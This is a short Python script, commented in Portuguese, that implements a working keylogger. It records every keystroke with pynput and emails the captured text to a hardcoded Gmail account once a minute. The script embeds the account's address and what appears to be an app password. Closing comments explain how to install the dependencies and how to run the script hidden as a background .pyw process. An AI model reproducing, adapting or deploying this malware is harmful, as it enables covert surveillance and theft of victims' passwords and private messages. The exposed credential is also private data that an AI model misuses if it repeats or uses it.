from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# Configurações de Email:
EMAIL_ORIGEM = "cyberaju79@gmail.com"
EMAIL_DESTINO = "cyberaju79@gmail.com"
SENHA_EMAIL = "ongg eewh bryx xmzu"

log = ""

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados"
        msg['FROM'] = EMAIL_ORIGEM
        msg['TO'] = EMAIL_DESTINO
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""

    # Agendar o envio a cada 1 minuto
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    
    try:
        # Tecla normal (Letra, número, simbolo)
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log+= " "
        elif key == keyboard.Key.enter:
            log+= "\n"
        elif key == keyboard.Key.tab:
            log+= "\t"
        elif key == keyboard.Key.backspace:
            log+= " "
        elif key == keyboard.Key.esc:
            log+= " [ESC] "
        else:
            pass

# Inicia o keylogger
with keyboard.Listener(on_press=on_press) as listner:
    enviar_email()
    listner.join()
        
        




        
# python -m venv .venv
# .\.venv\Scripts\activate
# pip install pynput
# pip install secure-smtplib


# rodar em segundo plano: alterar a extensão do script: no windows - ren .\keylogger.py .\keylogger.pyw

